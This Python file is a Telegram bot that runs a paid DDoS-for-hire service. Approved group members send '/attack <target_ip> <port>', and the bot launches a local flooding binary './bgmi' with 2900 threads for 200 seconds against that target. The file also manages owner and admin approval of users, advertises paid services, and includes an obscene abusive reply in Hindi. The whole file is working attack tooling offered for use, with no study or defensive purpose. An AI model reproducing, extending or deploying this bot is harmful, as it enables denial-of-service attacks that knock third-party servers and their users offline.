import subprocess
import json
import os
import asyncio
from telegram import Update, Chat, InputFile
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from config import BOT_TOKEN, OWNER_USERNAME, CHANNEL_LINK, CHANNEL_LOGO
import time

USER_FILE = "users.json"
ADMIN_FILE = "admins.json"
DEFAULT_THREADS = 2900
DEFAULT_PACKET = 20
DEFAULT_DURATION = 200  # Default attack duration

# Store the last attack time for each user (in seconds)
last_attack_time = {}

# Set a timeout in seconds (e.g., 60 seconds between attacks)
ATTACK_TIMEOUT = 260  # Example: 60 seconds timeout

users = {}
admins = {}
user_processes = {}

def load_data(file):
    """Load data from a JSON file."""
    try:
        with open(file, "r") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_data(file, data):
    """Save data to a JSON file."""
    with open(file, "w") as f:
        json.dump(data, f)

async def check_group(update: Update) -> bool:
    """Ensure the command is used in a group."""
    if update.message.chat.type == "private":
        await update.message.reply_text("❌ GROUP ME JAKE MAA CHUDA APNI. YAHA GAND NA MARA.")
        return False
    return True

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send bot info and channel link."""
    if not await check_group(update):
        return

    chat_id = update.message.chat.id
    message = (
        "🚀 **Welcome to the Attack Bot!** 🚀\n\n"
        "🔹 This bot allows you to launch attacks using /attack.\n"
        "🔹 Contact me for paid services @Riyahacksyt.\n"
        "🔹 Join our channel for updates:\n"
        f"[🔗 Click Here]({CHANNEL_LINK})\n\n"
        "💻 **Developed by**: " + f"@{OWNER_USERNAME}"
    )

    if os.path.exists(CHANNEL_LOGO):
        with open(CHANNEL_LOGO, "rb") as logo:
            await context.bot.send_photo(chat_id=chat_id, photo=InputFile(logo), caption=message, parse_mode="Markdown")
    else:
        await update.message.reply_text(message, parse_mode="Markdown")

async def add_admin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Owner can promote a user to admin."""
    if not await check_group(update):
        return

    if str(update.message.from_user.username) != OWNER_USERNAME:
        await update.message.reply_text("❌ Only the owner can add admins.")
        return

    if not context.args:
        await update.message.reply_text("Usage: /add_admin <user_id>")
        return

    user_id = context.args[0]
    admins[user_id] = True
    save_data(ADMIN_FILE, admins)

    await update.message.reply_text(f"✅ User {user_id} is now an admin.")

async def remove_admin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Owner can demote an admin."""
    if not await check_group(update):
        return

    if str(update.message.from_user.username) != OWNER_USERNAME:
        await update.message.reply_text("❌ Only the owner can remove admins.")
        return

    if not context.args:
        await update.message.reply_text("Usage: /remove_admin <user_id>")
        return

    user_id = context.args[0]
    if user_id in admins:
        del admins[user_id]
        save_data(ADMIN_FILE, admins)
        await update.message.reply_text(f"✅ User {user_id} is no longer an admin.")
    else:
        await update.message.reply_text(f"⚠️ User {user_id} is not an admin.")

async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Admins or owner can approve a user."""
    if not await check_group(update):
        return

    user_id = str(update.message.from_user.id)
    if user_id not in admins and str(update.message.from_user.username) != OWNER_USERNAME:
        await update.message.reply_text("❌ Only admins or the owner can add users.")
        return

    if not context.args:
        await update.message.reply_text("Usage: /add <user_id>")
        return

    target_user = context.args[0]
    users[target_user] = True
    save_data(USER_FILE, users)

    await update.message.reply_text(f"✅ User {target_user} has been approved.")

async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Admins or owner can revoke a user."""
    if not await check_group(update):
        return

    user_id = str(update.message.from_user.id)
    if user_id not in admins and str(update.message.from_user.username) != OWNER_USERNAME:
        await update.message.reply_text("❌ Only admins or the owner can remove users.")
        return

    if not context.args:
        await update.message.reply_text("Usage: /remove <user_id>")
        return

    target_user = context.args[0]
    if target_user in users:
        del users[target_user]
        save_data(USER_FILE, users)
        await update.message.reply_text(f"✅ User {target_user} has been removed.")
    else:
        await update.message.reply_text(f"⚠️ User {target_user} is not in the approved list.")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Approved users can execute an attack."""
    if not await check_group(update):
        return

    user_id = str(update.message.from_user.id)
    if user_id not in users:
        await update.message.reply_text("❌ You are not approved to use this command. Request approval from an Admin or Owner.")
        return

    # Check if the user has attacked recently
    current_time = time.time()
    last_time = last_attack_time.get(user_id, 0)
    if current_time - last_time < ATTACK_TIMEOUT:
        remaining_time = ATTACK_TIMEOUT - (current_time - last_time)
        await update.message.reply_text(f"⚠️ You must wait {int(remaining_time)} seconds before attacking again.")
        return

    if len(context.args) != 2:
        await update.message.reply_text('Usage: /attack <target_ip> <port>')
        return

    target_ip = context.args[0]
    port = context.args[1]

    if user_id in user_processes and user_processes[user_id].poll() is None:
        await update.message.reply_text("⚠️ An attack is already running. Please wait.")
        return

    command = ['./bgmi', target_ip, port, str(DEFAULT_DURATION), str(DEFAULT_PACKET), str(DEFAULT_THREADS)]
    process = subprocess.Popen(command)
    user_processes[user_id] = process

    # Record the time of this attack
    last_attack_time[user_id] = current_time

    await update.message.reply_text(f'🚀 Attack started: {target_ip}:{port} for {DEFAULT_DURATION} seconds.')

    await asyncio.sleep(DEFAULT_DURATION)

    process.terminate()
    del user_processes[user_id]

    await update.message.reply_text(f'✅ Attack finished: {target_ip}:{port}.')

async def all_members(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show all approved users and admins (owner and admins only)."""
    if not await check_group(update):
        return

    user_id = str(update.message.from_user.id)
    if user_id not in admins and str(update.message.from_user.username) != OWNER_USERNAME:
        await update.message.reply_text("❌ Only the owner or admins can use this command.")
        return

    approved_users_list = "\n".join(users.keys()) if users else "No approved users."
    admins_list = "\n".join(admins.keys()) if admins else "No admins."

    message = f"👥 **Approved Users:**\n{approved_users_list}\n\n👑 **Admins:**\n{admins_list}"
    await update.message.reply_text(message)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Display help message."""
    if not await check_group(update):
        return

    response = (
        f"🔹 **Commands:**\n\n"
        "📌 **User Commands:**\n"
        "  - `/attack <target_ip> <port>` → Start an attack (Approved users only)\n\n"
        "🔑 **Admin Commands:**\n"
        "  - `/add <user_id>` → Approve a user\n"
        "  - `/remove <user_id>` → Revoke a user's access\n"
        "  - `/allmembers` → Show all approved users and admins\n\n"
        "👑 **Owner Commands:**\n"
        "  - `/add_admin <user_id>` → Make a user an admin\n"
        "  - `/remove_admin <user_id>` → Remove admin privileges\n"
    )
    await update.message.reply_text(response)

def main() -> None:
    """Start the bot."""
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("add_admin", add_admin))
    application.add_handler(CommandHandler("remove_admin", remove_admin))
    application.add_handler(CommandHandler("allmembers", all_members))
    application.add_handler(CommandHandler("help", help_command))

    global users, admins
    users = load_data(USER_FILE)
    admins = load_data(ADMIN_FILE)

    application.run_polling()

if __name__ == '__main__':
    main()
